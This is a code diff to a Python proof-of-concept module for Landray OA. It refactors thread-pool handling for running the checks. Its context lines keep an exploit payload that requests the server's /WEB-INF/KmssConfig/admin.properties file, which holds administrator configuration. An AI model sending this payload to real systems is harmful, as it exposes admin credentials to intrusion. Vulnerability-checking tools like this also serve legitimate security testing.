@@ -34,7 +34,7 @@ class LandrayOA():
         data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
-        output = Output(pocname)
+        output = Output(self.url, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
         try:
@@ -66,12 +66,7 @@ tb.add_row([
 print(tb)
 
 def check(**kwargs):
-    from concurrent.futures import ThreadPoolExecutor,wait,ALL_COMPLETED
-    result_list = []
     thread_list = []
-    result_list.append('----------------------------')
-    #5代表只能开启5个进程, 不加默认使用cpu的进程数
-    pool = ThreadPoolExecutor(int(kwargs['pool_num']))
     ExpLandrayOA = LandrayOA(**kwargs)
     if kwargs['pocname'] != 'ALL':
         #返回对象函数属性值，可以直接调用
@@ -82,20 +77,9 @@ def check(**kwargs):
     else:
         for func in dir(LandrayOA):
             if not func.startswith("__"):
-                thread_list.append(pool.submit(getattr(ExpLandrayOA, func)))
+                thread_list.append(kwargs['pool'].submit(getattr(ExpLandrayOA, func)))
         #保存全局子线程列表
-        GlobalVar.set_value('thread_list', thread_list)
-        #等待所有多线程任务运行完
-        wait(thread_list, return_when=ALL_COMPLETED)
-        for task in thread_list:
-            #去除取消掉的future任务
-            if task.cancelled() == False:
-                if task.result() is None:
-                    result_list.append('函数没有返回值')
-                else:   
-                    result_list.append(task.result())
-    result_list.append('----------------------------')
-    return '\n'.join(result_list)
+        GlobalVar.add_value('thread_list', thread_list)
 
 
 
